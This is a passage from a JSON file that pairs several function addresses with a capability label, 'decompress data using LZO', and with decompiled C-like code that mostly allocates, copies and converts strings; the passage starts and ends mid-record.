1U < 0x3fffffff) {\n                iVar4 = (iStack376 + 1U) * 2;\n                iVar7 = fcn.004a34e0(iVar4);\n                fcn.00436340(iVar7, iStack376, 0);\n                piVar5[10] = iVar7;\n                *(iVar7 + -2 + iVar4) = 0;\n                piVar5[0xb] = iStack376;\n                if (puStack380 != &stack0xfffffe8c) {\n                    fcn.004a34c0(puStack380);\n                }\n                iVar4 = (**(*piVar6 + 0x24))();\n                piVar5[0xd] = iVar4;\n                iVar4 = (**(*piVar6 + 0x28))();\n                piVar5[0xe] = iVar4;\n                return;\n            }\n            piVar5 = fcn.004a3c30();\n            goto code_r0x0047696c;\n        }\n    }\n    else {\n        fcn.004a3c30();\n    }\n    fcn.004a3c30();\ncode_r0x0047696c:\n    if (puStack380 != &stack0xfffffe8c) {\n        fcn.004a34c0(puStack380);\n    }\n    fcn.0041b360(piVar5);\n    *extraout_ECX = 0x50a960;\n    fcn.0049ef40(extraout_ECX + 4);\n    *extraout_ECX = 0x50a6c0;\n    fcn.00471710();\n    fcn.004a34c0(extraout_ECX);\n    return;\n}\n",
        "token_count": 7438
    },
    "00476150": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_4\n\nvoid __cdecl\nfcn.00476150(uint noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    ushort uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint *extraout_ECX;\n    uint32_t uVar8;\n    int32_t *var_ch;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *puStack272;\n    int32_t iStack268;\n    uchar auStack264 [28];\n    int32_t iStack236;\n    int32_t *piStack232;\n    int32_t *piStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    int32_t iStack216;\n    int32_t *piStack212;\n    int32_t *piStack208;\n    int32_t iStack204;\n    uint uStack196;\n    int32_t iStack192;\n    int32_t *piStack188;\n    uint var_30h_3;\n    uint var_2ch_4;\n    uint var_28h_3;\n    uint var_3ch_2;\n    int32_t iStack164;\n    int32_t *piStack160;\n    uint var_30h_2;\n    uint var_2ch_3;\n    uint var_28h_2;\n    int32_t iStack144;\n    int32_t iStack128;\n    int32_t *var_ch_3;\n    uint32_t var_10h_3;\n    uchar *puStack116;\n    int32_t *piStack112;\n    int32_t *piStack108;\n    int32_t *piStack104;\n    int32_t iStack100;\n    int32_t var_ch_2;\n    int32_t *var_10h_2;\n    uint uStack88;\n    int32_t var_40h;\n    int32_t *var_3ch_3;\n    int32_t *var_30h_4;\n    int32_t *var_2ch_2;\n    uint var_28h_4;\n    uint var_ch_4;\n    \n    var_ch_2 = 0x476166;\n    uVar2 = (**(*var_ch + 8))();\n    *(noname_2 + 0x12) = uVar2;\n    var_ch_2 = 0x476171;\n    uVar2 = (**(*var_ch + 0xc))();\n    *(noname_2 + 0x14) = uVar2;\n    var_ch_2 = 0x47617c;\n    uVar3 = (**(*var_ch + 0x20))();\n    *(noname_2 + 8) = 0;\n    *(noname_2 + 0x30) = uVar3;\n    *(noname_2 + 0x18) = 0;\n    *(noname_2 + 0x20) = 0;\n    *(noname_2 + 0x28) = 0;\n    *(noname_2 + 0x52) = 1;\n    var_10h_2 = var_ch;\n    var_ch_2 = 0x4761aa;\n    (**(*var_ch + 0x10))();\n    piVar1 = var_2ch_2;\n    var_ch_2 = var_2ch_2 + 1;\n    iStack100 = 0x4761bb;\n    var_ch_2 = fcn.004a34e0();\n    uStack88 = 0;\n    var_10h_2 = piVar1;\n    iStack100 = 0x4761d5;\n    var_3ch_3 = var_ch_2;\n    fcn.00435590();\n    *(noname_2 + 0xc) = piVar1;\n    *(var_3ch_3 + piVar1) = 0;\n    *(noname_2 + 8) = var_3ch_3;\n    if (var_30h_4 != &fcn.00476150::var_28h_4) {\n        piStack108 = var_30h_4;\n        piStack112 = 0x4761f7;\n        fcn.004a34c0();\n    }\n    piStack108 = var_ch;\n    piStack112 = 0x476202;\n    (**(*var_ch + 0x14))();\n    var_10h_3 = var_2ch_2 + 1;\n    var_3ch_3 = var_2ch_2;\n    if (var_10h_3 < 0x3fffffff) {\n        piStack112 = var_10h_3 * 2;\n        puStack116 = 0x476228;\n        var_40h = piStack112;\n        iVar4 = fcn.004a34e0();\n        piStack104 = NULL;\n        piStack108 = var_3ch_3;\n        puStack116 = 0x476244;\n        piStack112 = iVar4;\n        fcn.00436340();\n        *(noname_2 + 0x18) = iVar4;\n        *(noname_2 + 0x1c) = var_3ch_3;\n        *(iVar4 + -2 + var_40h) = 0;\n        if (var_30h_4 != &fcn.00476150::var_28h_4) {\n            var_ch_3 = var_30h_4;\n            iStack128 = 0x47626c;\n            fcn.004a34c0();\n        }\n        var_ch_3 = var_ch;\n        iStack128 = 0x476277;\n        (**(*var_ch + 0x18))();\n        var_10h_3 = var_2ch_2 + 1;\n        var_3ch_3 = var_2ch_2;\n        if (0x3ffffffe < var_10h_3) goto code_r0x00476387;\n        puStack116 = 0x476299;\n        piStack112 = var_10h_3 * 2;\n        piStack112 = fcn.004a34e0();\n        piStack104 = NULL;\n        piStack108 = var_3ch_3;\n        puStack116 = 0x4762b8;\n        var_40h = piStack112;\n        fcn.00436340();\n        *(var_40h + -2 + var_10h_3 * 2) = 0;\n        *(noname_2 + 0x20) = var_40h;\n        *(noname_2 + 0x24) = var_3ch_3;\n        if (var_30h_4 != &fcn.00476150::var_28h_4) {\n            var_ch_3 = var_30h_4;\n            iStack128 = 0x4762e0;\n            fcn.004a34c0();\n        }\n        var_ch_3 = var_ch;\n        iStack128 = 0x4762eb;\n        (**(*var_ch + 0x1c))();\n        var_10h_3 = var_2ch_2 + 1;\n        var_3ch_3 = var_2ch_2;\n        if (var_10h_3 < 0x3fffffff) {\n            piStack112 = var_10h_3 * 2;\n            puStack116 = 0x47630d;\n            var_40h = piStack112;\n            iVar4 = fcn.004a34e0();\n            piStack104 = NULL;\n            piStack108 = var_3ch_3;\n            puStack116 = 0x476329;\n            piStack112 = iVar4;\n            fcn.00436340();\n            *(noname_2 + 0x28) = iVar4;\n            *(iVar4 + -2 + var_40h) = 0;\n            *(noname_2 + 0x2c) = var_3ch_3;\n            if (var_30h_4 != &fcn.00476150::var_28h_4) {\n                var_ch_3 = var_30h_4;\n                iStack128 = 0x476351;\n                fcn.004a34c0();\n            }\n            iStack128 = 0x476358;\n            uVar3 = (**(*var_ch + 0x24))();\n            *(noname_2 + 0x34) = uVar3;\n            iStack128 = 0x476362;\n            uVar3 = (**(*var_ch + 0x28))();\n            *(noname_2 + 0x38) = uVar3;\n            return;\n        }\n        puStack116 = 0x47637a;\n        noname_2 = fcn.004a3c30();\n    }\n    else {\n        puStack116 = 0x476387;\n        fcn.004a3c30();\ncode_r0x00476387:\n        puStack116 = 0x47638c;\n        fcn.004a3c30();\n    }\n    if (var_30h_4 != &fcn.00476150::var_28h_4) {\n        piStack112 = var_30h_4;\n        puStack116 = 0x47639e;\n        fcn.004a34c0();\n    }\n    puStack116 = 0x4763a6;\n    piStack112 = noname_2;\n    fcn.0041b360();\n    iVar6 = iStack100;\n    piVar1 = piStack104;\n    var_ch_3 = var_ch;\n    iStack192 = 0x4763c6;\n    iStack128 = noname_2;\n    puStack116 = &stack0xfffffffc;\n    uVar2 = (**(*piStack104 + 8))();\n    *(iVar6 + 0x12) = uVar2;\n    iStack192 = 0x4763d1;\n    uVar2 = (**(*piVar1 + 0xc))();\n    *(iVar6 + 0x14) = uVar2;\n    iStack192 = 0x4763dc;\n    uVar3 = (**(*piVar1 + 0x20))();\n    *(iVar6 + 8) = 0;\n    *(iVar6 + 0x30) = uVar3;\n    *(iVar6 + 0x18) = 0;\n    *(iVar6 + 0x20) = 0;\n    *(iVar6 + 0x28) = 0;\n    *(iVar6 + 0x52) = 1;\n    piStack188 = piVar1;\n    iStack192 = 0x47640a;\n    (**(*piVar1 + 0x10))();\n    iVar4 = *(iStack144 + -0xc);\n    iStack192 = iVar4 + 1;\n    uStack196 = 0x47641e;\n    iStack192 = fcn.004a34e0();\n    var_30h_3 = 0;\n    uStack196 = 0x476438;\n    piStack188 = iVar4;\n    piStack160 = iStack192;\n    fcn.0042ca00();\n    *(iVar6 + 0xc) = iVar4;\n    *(piStack160 + iVar4) = 0;\n    *(iVar6 + 8) = piStack160;\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar5 = iStack144 + -4;\n        iVar4 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack204 = &fcn.00476150::var_28h_2 + 3;\n        piStack208 = 0x476640;\n        fcn.0046bf60();\n    }\n    piStack208 = piVar1;\n    piStack212 = 0x476474;\n    (**(*piVar1 + 0x14))();\n    piStack160 = *(iStack144 + -0xc);\n    uVar8 = piStack160 + 1;\n    if (uVar8 < 0x3fffffff) {\n        piStack212 = uVar8 * 2;\n        iStack216 = 0x47649d;\n        iStack164 = piStack212;\n        piVar5 = fcn.004a34e0();\n        iStack204 = 0;\n        piStack208 = piStack160;\n        iStack216 = 0x4764b9;\n        piStack212 = piVar5;\n        fcn.0042bb20();\n        *(iVar6 + 0x18) = piVar5;\n        *(piVar5 + iStack164 + -2) = 0;\n        *(iVar6 + 0x1c) = piStack160;\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(iStack144 + -4);\n            *(iStack144 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar5 = iStack144 + -4;\n            iVar4 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack224 = &fcn.00476150::var_28h_2 + 3;\n            piStack228 = 0x476670;\n            fcn.004640a0();\n        }\n        piStack228 = piVar1;\n        piStack232 = 0x4764fb;\n        (**(*piVar1 + 0x18))();\n        piStack160 = *(iStack144 + -0xc);\n        uVar8 = piStack160 + 1;\n        if (0x3ffffffe < uVar8) goto code_r0x004766ff;\n        iStack220 = 0x476520;\n        iStack216 = uVar8 * 2;\n        iStack216 = fcn.004a34e0();\n        piStack208 = NULL;\n        piStack212 = piStack160;\n        iStack220 = 0x47653f;\n        iStack164 = iStack216;\n        fcn.0042bb20();\n        *(iStack164 + -2 + uVar8 * 2) = 0;\n        iVar4 = *0x4f59f4;\n        *(iVar6 + 0x20) = iStack164;\n        *(iVar6 + 0x24) = piStack160;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack144 + -4);\n            *(iStack144 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar5 = iStack144 + -4;\n            iVar4 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack228 = &fcn.00476150::var_28h_2 + 3;\n            piStack232 = 0x4766a0;\n            fcn.004640a0();\n        }\n        piStack232 = piVar1;\n        iStack236 = 0x476581;\n        (**(*piVar1 + 0x1c))();\n        piStack160 = *(iStack144 + -0xc);\n        uVar8 = piStack160 + 1;\n        if (uVar8 < 0x3fffffff) {\n            iStack216 = uVar8 * 2;\n            iStack220 = 0x4765aa;\n            iStack164 = iStack216;\n            iVar4 = fcn.004a34e0();\n            piStack208 = NULL;\n            piStack212 = piStack160;\n            iStack220 = 0x4765c6;\n            iStack216 = iVar4;\n            fcn.0042bb20();\n            *(iVar6 + 0x28) = iVar4;\n            *(iVar4 + -2 + iStack164) = 0;\n            iVar4 = *0x4f59f4;\n            *(iVar6 + 0x2c) = piStack160;\n            if (iVar4 == 0) {\n                iVar4 = *(iStack144 + -4);\n                *(iStack144 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar5 = iStack144 + -4;\n                iVar4 = *piVar5;\n                *piVar5 = *piVar5 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack228 = &fcn.00476150::var_28h_2 + 3;\n                piStack232 = 0x4766d0;\n                fcn.004640a0();\n            }\n            iStack236 = 0x476605;\n            uVar3 = (**(*piVar1 + 0x24))();\n            *(iVar6 + 0x34) = uVar3;\n            iStack236 = 0x47660f;\n            uVar3 = (**(*piVar1 + 0x28))();\n            *(iVar6 + 0x38) = uVar3;\n            return;\n        }\n        iStack220 = 0x476711;\n        fcn.004a3c30();\n    }\n    else {\n        iStack216 = 0x4766e5;\n        fcn.004a3c30();\n        piStack212 = &fcn.00476150::var_28h_2 + 3;\n        iStack216 = 0x4766f6;\n        fcn.0046bf80();\n        iStack216 = iVar6;\n        iStack220 = 0x4766ff;\n        fcn.0041b360();\ncode_r0x004766ff:\n        iStack220 = 0x476704;\n        iVar6 = fcn.004a3c30();\n    }\n    iStack216 = &fcn.00476150::var_28h_2 + 3;\n    iStack220 = 0x476722;\n    fcn.004640c0();\n    puStack224 = 0x47672b;\n    iStack220 = iVar6;\n    fcn.0041b360();\n    piVar7 = piStack208;\n    piVar5 = piStack212;\n    piStack232 = piVar1;\n    iStack236 = iVar6;\n    piStack228 = uVar8;\n    puStack224 = &stack0xffffff8c;\n    uVar2 = (**(*piStack212 + 8))();\n    *(piVar7 + 0x12) = uVar2;\n    uVar2 = (**(*piVar5 + 0xc))();\n    *(piVar7 + 5) = uVar2;\n    iVar4 = (**(*piVar5 + 0x20))();\n    piVar7[2] = 0;\n    piVar7[0xc] = iVar4;\n    piVar7[6] = 0;\n    piVar7[8] = 0;\n    piVar7[10] = 0;\n    *(piVar7 + 0x52) = 1;\n    (**(*piVar5 + 0x10))(piVar5);\n    iVar4 = fcn.004a34e0(iStack268 + 1);\n    fcn.00435590(iVar4, iStack268, 0);\n    piVar7[3] = iStack268;\n    *(iVar4 + iStack268) = 0;\n    piVar7[2] = iVar4;\n    if (puStack272 != &stack0xfffffef8) {\n        fcn.004a34c0(puStack272);\n    }\n    (**(*piVar5 + 0x14))(piVar5);\n    if (iStack268 + 1U < 0x3fffffff) {\n        iVar4 = (iStack268 + 1U) * 2;\n        iVar6 = fcn.004a34e0(iVar4);\n        fcn.00436340(iVar6, iStack268, 0);\n        piVar7[6] = iVar6;\n        piVar7[7] = iStack268;\n        *(iVar6 + -2 + iVar4) = 0;\n        if (puStack272 != &stack0xfffffef8) {\n            fcn.004a34c0(puStack272);\n        }\n        (**(*piVar5 + 0x18))(piVar5);\n        if (iStack268 + 1U < 0x3fffffff) {\n            iVar4 = (iStack268 + 1U) * 2;\n            iVar6 = fcn.004a34e0(iVar4);\n            fcn.00436340(iVar6, iStack268, 0);\n            *(iVar6 + -2 + iVar4) = 0;\n            piVar7[8] = iVar6;\n            piVar7[9] = iStack268;\n            if (puStack272 != &stack0xfffffef8) {\n                fcn.004a34c0(puStack272);\n            }\n            (**(*piVar5 + 0x1c))(piVar5);\n            if (iStack268 + 1U < 0x3fffffff) {\n                iVar4 = (iStack268 + 1U) * 2;\n                iVar6 = fcn.004a34e0(iVar4);\n                fcn.00436340(iVar6, iStack268, 0);\n                piVar7[10] = iVar6;\n                *(iVar6 + -2 + iVar4) = 0;\n                piVar7[0xb] = iStack268;\n                if (puStack272 != &stack0xfffffef8) {\n                    fcn.004a34c0(puStack272);\n                }\n                iVar4 = (**(*piVar5 + 0x24))();\n                piVar7[0xd] = iVar4;\n                iVar4 = (**(*piVar5 + 0x28))();\n                piVar7[0xe] = iVar4;\n                return;\n            }\n            piVar7 = fcn.004a3c30();\n            goto code_r0x0047696c;\n        }\n    }\n    else {\n        fcn.004a3c30();\n    }\n    fcn.004a3c30();\ncode_r0x0047696c:\n    if (puStack272 != &stack0xfffffef8) {\n        fcn.004a34c0(puStack272);\n    }\n    fcn.0041b360(piVar7);\n    *extraout_ECX = 0x50a960;\n    fcn.0049ef40(extraout_ECX + 4);\n    *extraout_ECX = 0x50a6c0;\n    fcn.00471710();\n    fcn.004a34c0(extraout_ECX);\n    return;\n}\n",
        "token_count": 5321
    },
    "004763b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004763b0(uint param_1, int32_t *param_2, int32_t param_3)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *extraout_ECX;\n    uint32_t uVar7;\n    int32_t *var_ch;\n    int32_t var_10h;\n    uint var_30h_3;\n    uint var_2ch_4;\n    uint var_1ch_3;\n    uint *puStack160;\n    int32_t var_30h_2;\n    uint var_2ch_3;\n    uint var_28h_2;\n    uint var_1ch_2;\n    int32_t var_ch_3;\n    int32_t *var_10h_3;\n    int32_t *piStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    int32_t *piStack100;\n    int32_t *piStack96;\n    uchar *var_10h_2;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t iStack52;\n    int32_t *var_2ch_2;\n    uchar var_1dh;\n    int32_t var_1ch;\n    \n    iStack80 = 0x4763c6;\n    uVar1 = (**(*var_ch + 8))();\n    *(var_10h + 0x12) = uVar1;\n    iStack80 = 0x4763d1;\n    uVar1 = (**(*var_ch + 0xc))();\n    *(var_10h + 0x14) = uVar1;\n    iStack80 = 0x4763dc;\n    uVar2 = (**(*var_ch + 0x20))();\n    *(var_10h + 8) = 0;\n    *(var_10h + 0x30) = uVar2;\n    *(var_10h + 0x18) = 0;\n    *(var_10h + 0x20) = 0;\n    *(var_10h + 0x28) = 0;\n    *(var_10h + 0x52) = 1;\n    piStack76 = var_ch;\n    iStack80 = 0x47640a;\n    (**(*var_ch + 0x10))();\n    iVar4 = *(var_1ch + -0xc);\n    iStack80 = iVar4 + 1;\n    uStack84 = 0x47641e;\n    iStack80 = fcn.004a34e0();\n    uStack72 = 0;\n    uStack84 = 0x476438;\n    piStack76 = iVar4;\n    var_2ch_2 = iStack80;\n    fcn.0042ca00();\n    *(var_10h + 0xc) = iVar4;\n    *(var_2ch_2 + iVar4) = 0;\n    *(var_10h + 8) = var_2ch_2;\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_1ch + -4;\n        iVar4 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (iVar4 < 1) {\n        var_10h_2 = &stack0xffffffdf;\n        piStack96 = 0x476640;\n        fcn.0046bf60();\n    }\n    piStack96 = var_ch;\n    piStack100 = 0x476474;\n    (**(*var_ch + 0x14))();\n    var_2ch_2 = *(var_1ch + -0xc);\n    uVar7 = var_2ch_2 + 1;\n    if (uVar7 < 0x3fffffff) {\n        piStack100 = uVar7 * 2;\n        puStack104 = 0x47649d;\n        iStack52 = piStack100;\n        piVar3 = fcn.004a34e0();\n        var_10h_2 = NULL;\n        piStack96 = var_2ch_2;\n        puStack104 = 0x4764b9;\n        piStack100 = piVar3;\n        fcn.0042bb20();\n        *(var_10h + 0x18) = piVar3;\n        *(piVar3 + iStack52 + -2) = 0;\n        *(var_10h + 0x1c) = var_2ch_2;\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(var_1ch + -4);\n            *(var_1ch + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack112 = &stack0xffffffdf;\n            piStack116 = 0x476670;\n            fcn.004640a0();\n        }\n        piStack116 = var_ch;\n        var_10h_3 = 0x4764fb;\n        (**(*var_ch + 0x18))();\n        var_2ch_2 = *(var_1ch + -0xc);\n        uVar7 = var_2ch_2 + 1;\n        if (0x3ffffffe < uVar7) goto code_r0x004766ff;\n        iStack108 = 0x476520;\n        puStack104 = uVar7 * 2;\n        puStack104 = fcn.004a34e0();\n        piStack96 = NULL;\n        piStack100 = var_2ch_2;\n        iStack108 = 0x47653f;\n        iStack52 = puStack104;\n        fcn.0042bb20();\n        *(iStack52 + -2 + uVar7 * 2) = 0;\n        iVar4 = *0x4f59f4;\n        *(var_10h + 0x20) = iStack52;\n        *(var_10h + 0x24) = var_2ch_2;\n        if (iVar4 == 0) {\n            iVar4 = *(var_1ch + -4);\n            *(var_1ch + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack116 = &stack0xffffffdf;\n            var_10h_3 = 0x4766a0;\n            fcn.004640a0();\n        }\n        var_10h_3 = var_ch;\n        var_ch_3 = 0x476581;\n        (**(*var_ch + 0x1c))();\n        var_2ch_2 = *(var_1ch + -0xc);\n        uVar7 = var_2ch_2 + 1;\n        if (uVar7 < 0x3fffffff) {\n            puStack104 = uVar7 * 2;\n            iStack108 = 0x4765aa;\n            iStack52 = puStack104;\n            iVar4 = fcn.004a34e0();\n            piStack96 = NULL;\n            piStack100 = var_2ch_2;\n            iStack108 = 0x4765c6;\n            puStack104 = iVar4;\n            fcn.0042bb20();\n            *(var_10h + 0x28) = iVar4;\n            *(iVar4 + -2 + iStack52) = 0;\n            iVar4 = *0x4f59f4;\n            *(var_10h + 0x2c) = var_2ch_2;\n            if (iVar4 == 0) {\n                iVar4 = *(var_1ch + -4);\n                *(var_1ch + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar3 = var_1ch + -4;\n                iVar4 = *piVar3;\n                *piVar3 = *piVar3 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack116 = &stack0xffffffdf;\n                var_10h_3 = 0x4766d0;\n                fcn.004640a0();\n            }\n            var_ch_3 = 0x476605;\n            uVar2 = (**(*var_ch + 0x24))();\n            *(var_10h + 0x34) = uVar2;\n            var_ch_3 = 0x47660f;\n            uVar2 = (**(*var_ch + 0x28))();\n            *(var_10h + 0x38) = uVar2;\n            return;\n        }\n        iStack108 = 0x476711;\n        fcn.004a3c30();\n    }\n    else {\n        puStack104 = 0x4766e5;\n        fcn.004a3c30();\n        piStack100 = &stack0xffffffdf;\n        puStack104 = 0x4766f6;\n        fcn.0046bf80();\n        puStack104 = var_10h;\n        iStack108 = 0x4766ff;\n        fcn.0041b360();\ncode_r0x004766ff:\n        iStack108 = 0x476704;\n        var_10h = fcn.004a3c30();\n    }\n    puStack104 = &stack0xffffffdf;\n    iStack108 = 0x476722;\n    fcn.004640c0();\n    puStack112 = 0x47672b;\n    iStack108 = var_10h;\n    fcn.0041b360();\n    piVar6 = piStack96;\n    piVar3 = piStack100;\n    var_10h_3 = var_ch;\n    var_ch_3 = var_10h;\n    piStack116 = uVar7;\n    puStack112 = &stack0xfffffffc;\n    uVar1 = (**(*piStack100 + 8))();\n    *(piVar6 + 0x12) = uVar1;\n    uVar1 = (**(*piVar3 + 0xc))();\n    *(piVar6 + 5) = uVar1;\n    iVar4 = (**(*piVar3 + 0x20))();\n    piVar6[2] = 0;\n    piVar6[0xc] = iVar4;\n    piVar6[6] = 0;\n    piVar6[8] = 0;\n    piVar6[10] = 0;\n    *(piVar6 + 0x52) = 1;\n    (**(*piVar3 + 0x10))(piVar3);\n    iVar4 = fcn.004a34e0(var_30h_2 + 1);\n    fcn.00435590(iVar4, var_30h_2, 0);\n    piVar6[3] = var_30h_2;\n    *(iVar4 + var_30h_2) = 0;\n    piVar6[2] = iVar4;\n    if (puStack160 != &fcn.004763b0::var_2ch_3) {\n        fcn.004a34c0(puStack160);\n    }\n    (**(*piVar3 + 0x14))(piVar3);\n    if (var_30h_2 + 1U < 0x3fffffff) {\n        iVar4 = (var_30h_2 + 1U) * 2;\n        iVar5 = fcn.004a34e0(iVar4);\n        fcn.00436340(iVar5, var_30h_2, 0);\n        piVar6[6] = iVar5;\n        piVar6[7] = var_30h_2;\n        *(iVar5 + -2 + iVar4) = 0;\n        if (puStack160 != &fcn.004763b0::var_2ch_3) {\n            fcn.004a34c0(puStack160);\n        }\n        (**(*piVar3 + 0x18))(piVar3);\n        if (var_30h_2 + 1U < 0x3fffffff) {\n            iVar4 = (var_30h_2 + 1U) * 2;\n            iVar5 = fcn.004a34e0(iVar4);\n            fcn.00436340(iVar5, var_30h_2, 0);\n            *(iVar5 + -2 + iVar4) = 0;\n            piVar6[8] = iVar5;\n            piVar6[9] = var_30h_2;\n            if (puStack160 != &fcn.004763b0::var_2ch_3) {\n                fcn.004a34c0(puStack160);\n            }\n            (**(*piVar3 + 0x1c))(piVar3);\n            if (var_30h_2 + 1U < 0x3fffffff) {\n                iVar4 = (var_30h_2 + 1U) * 2;\n                iVar5 = fcn.004a34e0(iVar4);\n                fcn.00436340(iVar5, var_30h_2, 0);\n                piVar6[10] = iVar5;\n                *(iVar5 + -2 + iVar4) = 0;\n                piVar6[0xb] = var_30h_2;\n                if (puStack160 != &fcn.004763b0::var_2ch_3) {\n                    fcn.004a34c0(puStack160);\n                }\n                iVar4 = (**(*piVar3 + 0x24))();\n                piVar6[0xd] = iVar4;\n                iVar4 = (**(*piVar3 + 0x28))();\n                piVar6[0xe] = iVar4;\n                return;\n            }\n            piVar6 = fcn.004a3c30();\n            goto code_r0x0047696c;\n        }\n    }\n    else {\n        fcn.004a3c30();\n    }\n    fcn.004a3c30();\ncode_r0x0047696c:\n    if (puStack160 != &fcn.004763b0::var_2ch_3) {\n        fcn.004a34c0(puStack160);\n    }\n    fcn.0041b360(piVar6);\n    *extraout_ECX = 0x50a960;\n    fcn.0049ef40(extraout_ECX + 4);\n    *extraout_ECX = 0x50a6c0;\n    fcn.00471710();\n    fcn.004a34c0(extraout_ECX);\n    return;\n}\n",
        "token_count": 3405
    },
    "00476730": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00476730(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x12) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x14) = uVar1;\n    uVar2 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x30) = uVar2;\n    *(arg_10h + 0x18) = 0;\n    *(arg_10h + 0x20) = 0;\n    *(arg_10h + 0x28) = 0;\n    *(arg_10h + 0x52) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    if (var_2ch + 1U < 0x3fffffff) {\n        iVar3 = (var_2ch + 1U) * 2;\n        iVar4 = fcn.004a34e0(iVar3);\n        fcn.00436340(iVar4, var_2ch, 0);\n        *(arg_10h + 0x18) = iVar4;\n        *(arg_10h + 0x1c) = var_2ch;\n        *(iVar4 + -2 + iVar3) = 0;\n        if (var_30h != &var_28h) {\n            fcn.004a34c0(var_30h);\n        }\n        (**(*arg_ch + 0x18))(arg_ch);\n        if (var_2ch + 1U < 0x3fffffff) {\n            iVar3 = (var_2ch + 1U) * 2;\n            iVar4 = fcn.004a34e0(iVar3);\n            fcn.00436340(iVar4, var_2ch, 0);\n            *(iVar4 + -2 + iVar3) = 0;\n            *(arg_10h + 0x20) = iVar4;\n            *(arg_10h + 0x24) = var_2ch;\n            if (var_30h != &var_28h) {\n                fcn.004a34c0(var_30h);\n            }\n            (**(*arg_ch + 0x1c))(arg_ch);\n            if (var_2ch + 1U < 0x3fffffff) {\n                iVar3 = (var_2ch + 1U) * 2;\n                iVar4 = fcn.004a34e0(iVar3);\n                fcn.00436340(iVar4, var_2ch, 0);\n                *(arg_10h + 0x28) = iVar4;\n                *(iVar4 + -2 + iVar3) = 0;\n                *(arg_10h + 0x2c) = var_2ch;\n                if (var_30h != &var_28h) {\n                    fcn.004a34c0(var_30h);\n                }\n                uVar2 = (**(*arg_ch + 0x24))();\n                *(arg_10h + 0x34) = uVar2;\n                uVar2 = (**(*arg_ch + 0x28))();\n                *(arg_10h + 0x38) = uVar2;\n                return;\n            }\n            arg_10h = fcn.004a3c30();\n            goto code_r0x0047696c;\n        }\n    }\n    else {\n        fcn.004a3c30();\n    }\n    fcn.004a3c30();\ncode_r0x0047696c:\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    fcn.0041b360(arg_10h);\n    *extraout_ECX = 0x50a960;\n    fcn.0049ef40(extraout_ECX + 4);\n    *extraout_ECX = 0x50a6c0;\n    fcn.00471710();\n    fcn.004a34c0(extraout_ECX);\n    return;\n}\n",
        "token_count": 1179
    },
    "00481720": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
